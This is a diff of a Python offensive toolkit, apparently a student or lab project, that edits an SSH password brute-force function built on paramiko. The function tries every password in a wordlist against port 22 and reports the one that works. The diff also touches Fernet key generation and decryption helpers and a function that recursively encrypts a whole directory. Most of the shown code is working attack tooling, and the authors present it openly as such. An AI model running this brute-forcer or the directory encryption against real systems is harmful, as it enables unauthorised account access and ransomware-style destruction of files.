@@ -1,4 +1,5 @@
-#!/bin/usr/python3
+#!/usr/bin/python3
+# Created by Omar Ardid adn Cody Blahnik
 import subprocess
 from cryptography.fernet import Fernet
 from scapy.layers.inet import IP, TCP, ICMP
@@ -8,7 +9,6 @@ import logging
 import time
 import paramiko, os, sys, socket
 import zipfile
-
 
 # Suppressing Scapy warnings
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -97,7 +97,7 @@ def icmp_ping_and_scan(target_ip, ports):
 # Function to read passwords from a file
 def read_passwords(password_file):
     # Open the file in read mode
-    with open (password_file, "r") as file:
+    with open(password_file, "r") as file:
         # Read each line, strip trailing whitespace, and return as a list
         return [line.rstrip() for line in file]
 
@@ -106,58 +106,63 @@ def check_filepath(file_path, file_description):
     # Check if the given path is a valid file
     if not os.path.isfile(file_path):
         print(f"(ง •̀_•́)ง {file_description} not found. Please enter a valid file path!")
-        # Return False if the is not found
+        # Return False if the file is not found
         return False
     # Return True if the file path is valid
     return True
 
 def ssh_brute_force(target_ip):    
-        # Prompt the user for target host address, SSH username, and password file path
-        username = input("Enter SSH Username: ")
-        input_file = input("Enter SSH Password File: ")
+    # Prompt the user for target host address, SSH username, and password file path
+    username = input("Enter SSH Username: ")
+    input_file = input("Enter SSH Password File: ")
 
-        # Checks if file path exists
-        if not check_filepath(input_file, "Password file"):
-            return   
-        try:
-            # Open password file in read mode
-            with open(input_file, 'r') as file:
-                # Iterate over each password in the file
-                for password in file:
-                    # Remove trailing whitespace from password
-                    password = password.rstrip()
-                    try:
-                        # Create an SSH Client instance
-                        ssh = paramiko.SSHClient()
-                        # Set policy for automatically adding host keys
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        # Attempt SSH connection using the current password
-                        print(f"Trying password: {password}")
-                        ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=10, auth_timeout=10)
-                        # Close the SSH connection
-                        ssh.close()
-                        # Print success message if password is correct
-                        print(f"٩(◕‿◕)۶ Success! Password found: {password}")
-                        return
-                    except paramiko.AuthenticationException:
-                        # Print error message if authentication fails
-                        print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
-                    except socket.error as e:
-                        # Print error message if a socket error occurs
-                        print(f"(`･︿´･ ) An error occurred: {e}")
-        except KeyboardInterrupt:
-            # Print message if user interrupts the process
-            print("User Requested An Interrupt")
-            # Exit the program
-            sys.exit(3)
+    # Checks if file path exists
+    if not check_filepath(input_file, "Password file"):
+        return
+
+    try:
+        # Open password file in read mode
+        with open(input_file, 'r') as file:
+            # Iterate over each password in the file
+            for password in file:
+                # Remove trailing whitespace from password
+                password = password.rstrip()
+                try:
+                    # Create an SSH Client instance
+                    ssh = paramiko.SSHClient()
+                    # Set policy for automatically adding host keys
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    # Attempt SSH connection using the current password
+                    print(f"Trying password: {password}")
+                    ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=10, auth_timeout=10)
+                    # Close the SSH connection
+                    # ssh.close()
+                    # Print success message if password is correct
+                    print(f"٩(◕‿◕)۶ Success! Password found: {password}")
+                    return
+                except paramiko.AuthenticationException:
+                    # Print error message if authentication fails
+                    print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
+                except socket.error as e:
+                    # Print error message if a socket error occurs
+                    print(f"(`･︿´･ ) An error occurred: {e}")
+                except paramiko.SSHException as e:
+                    # Handle other SSH exceptions
+                    print(f"(`･︿´･ ) SSH error occurred: {e}")
+                    time.sleep(1)  # Sleep briefly to avoid overwhelming the server
+    except KeyboardInterrupt:
+        # Print message if user interrupts the process
+        print("User Requested An Interrupt")
+        # Exit the program
+        sys.exit(3)
 
 # Function to generate and write a key to a file
 def write_key():
     key = Fernet.generate_key()
-    with open("key.key","wb") as key_file:
+    with open("key.key", "wb") as key_file:
         key_file.write(key)
 
-# Function  to load the key from a file
+# Function to load the key from a file
 def load_key():
     return open("key.key", "rb").read()
 
@@ -186,6 +191,8 @@ def decrypt_file(file_path, key):
         print("File decrypted successfully!")
     except FileNotFoundError:
         print(f"Error: Encrypted file '{file_path}' not found.")
+    except Exception as e:
+        print(f"Error decrypting file: {e}")
 
 def encrypt_directory(directory_path, key):
     # Using Recursively to encrypt all files in the specified directory and its subdirectories
